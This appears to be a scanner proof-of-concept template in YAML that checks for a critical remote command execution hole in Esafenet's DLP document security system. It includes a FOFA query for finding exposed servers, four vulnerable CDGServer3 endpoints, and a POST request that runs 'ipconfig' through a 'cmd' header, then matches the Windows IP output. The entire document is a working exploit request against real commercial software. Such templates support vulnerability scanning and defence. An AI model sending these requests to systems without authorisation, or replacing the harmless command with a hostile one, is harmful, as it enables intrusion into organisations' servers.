id: poc-yaml-esafenet-data-loss-prevention-rce
info:
  name: 亿赛通-数据泄露防护(DLP)多个接口 命令执行漏洞
  severity: critical
  tags:
  - rce
  finger: 亿赛通电子文档安全管理系统
  fofa: body="CDGServer3" || title="电子文档安全管理系统"
variables:
  path: 'FileCountService

    ExamCDGDocService1

    EmailAuditService

    docRenewApp

    '
requests:
- method: POST
  path: /CDGServer3/{{.path}}?command=GETSYSTEMINFO
  headers:
    Content-Type: text/xml
    cmd: ipconfig
  data: 
  expression: 'status_code == 200 &&

    contains(body,"Windows IP") &&

    contains(body,"IPv4") &&

    contains(body,"DNS") &&

    !contains(body,"<")

    '
transport: http
